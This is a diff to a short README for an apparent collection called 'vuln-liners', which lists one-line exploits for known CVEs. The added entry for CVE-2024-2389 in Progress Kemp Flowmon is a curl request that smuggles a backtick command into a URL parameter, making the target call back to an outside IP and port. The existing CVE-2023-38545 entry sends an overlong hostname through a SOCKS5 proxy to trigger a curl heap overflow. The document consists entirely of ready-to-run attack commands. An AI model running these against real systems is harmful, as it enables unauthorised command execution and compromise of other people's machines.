@@ -1,6 +1,9 @@
 # vuln-liners
 One line vulnerabilities
 
+## CVE-2024-2389 (Progress Kemp Flowmon):
+`curl -kv 'https://192.168.56.12/service.pdfs/confluence?lang=en&file=`curl+IP+PORT`'`
+
 ## CVE-2023-38545
 `curl -vvv -x socks5h://localhost:9050 $(python3 -c "print(('A'*10000), end='')")`
 
